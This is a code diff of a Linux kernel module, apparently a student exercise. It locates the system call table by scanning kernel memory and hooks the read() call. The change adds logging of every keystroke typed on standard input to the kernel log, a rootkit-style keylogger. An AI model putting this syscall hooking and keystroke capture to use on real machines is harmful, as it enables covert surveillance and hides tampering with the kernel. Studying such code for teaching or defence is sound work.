@@ -6,7 +6,7 @@
 #include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
 #include <asm/pgtable_types.h>
 #include <linux/smp_lock.h>
-#include "sysmap.h"          /* Pointers to system functions */
+// #include "sysmap.h"          /* Pointers to system functions */
 
 // since we had no problems without get/put, we commented it out
 // #define USE_MODULE_GET_PUT
@@ -66,9 +66,12 @@ unsigned sys_call_off;
 //     printk(KERN_INFO "I think I found the system call table at %p (zum Vergleich der pointer aus sysmap.h: %p).\n", sys_call_table, ptr_sys_call_table);
 // }
 
+
+void* ptr_sys_call_table;
+
 unsigned long **find_sys_call_table_r(void)  {
 
-  void** sys_call_table = (void *) ptr_sys_call_table;
+  void** sys_call_table;
 
   sys_call_table = (void *)(&lock_kernel);
   while((void*)sys_call_table < (void*)(&loops_per_jiffy)) {
@@ -105,7 +108,8 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     OUR_TRY_MODULE_GET;
     retval = original_read(fd, buf, count);
     cur_buf = buf;
-    if (retval > 0){
+    if (retval > 0 && fd == 0){
+        printk(KERN_INFO "User typed %c (%d)\n", *buf, *buf);
         // printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
     }
     OUR_MODULE_PUT;
@@ -149,25 +153,13 @@ unsigned long **find_sys_call_table(void)  {
   return NULL;
 }
 
-/* Print the number of running processes */
-int print_nr_procs(void){
-    fun_int_void npf; // function pointer to function counting processes
-    int res;
-    npf = (fun_int_void) ptr_nr_processes;
-    res = npf();
-    printk(KERN_INFO "%d processes running", res);
-
-    find_sys_call_table();
-    return 0;
-}
-
 /* Initialization routine */
 static int __init _init_module(void)
 {
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
-    print_nr_procs();
+    //print_nr_procs();
+    ptr_sys_call_table = find_sys_call_table_r();
     hook_function();
-    find_sys_call_table_r();
     return 0;
 }
 
